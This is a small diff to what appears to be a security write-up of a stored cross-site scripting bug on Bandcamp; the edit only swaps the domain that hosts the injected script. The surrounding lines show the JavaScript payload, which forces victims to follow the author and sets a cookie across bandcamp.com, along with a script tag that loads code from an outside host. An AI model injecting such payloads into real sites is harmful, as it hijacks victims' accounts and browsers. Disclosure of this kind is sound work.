@@ -22,7 +22,7 @@ alert("Your cookies: " + document.cookie);
 document.getElementById("follow-unfollow").click();alert("Thanks for the follow :^D");
 document.cookie="hacker=cdl;path=/;domain=.bandcamp.com";  
 ```
-Then changed the **Item Title** to `<script src=//C0RB3N.pro/bandcamp.js></script>`
+Then changed the **Item Title** to `<script src=//www.corben.io/bandcamp.js></script>`
 which made the victim follow me and set the cookie "hacker" to "cdl" for bandcamp.com and all subdomains in their browser!
 <br>Proof of concept video:
 <iframe src="https://player.vimeo.com/video/224109910" width="640" height="360" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>
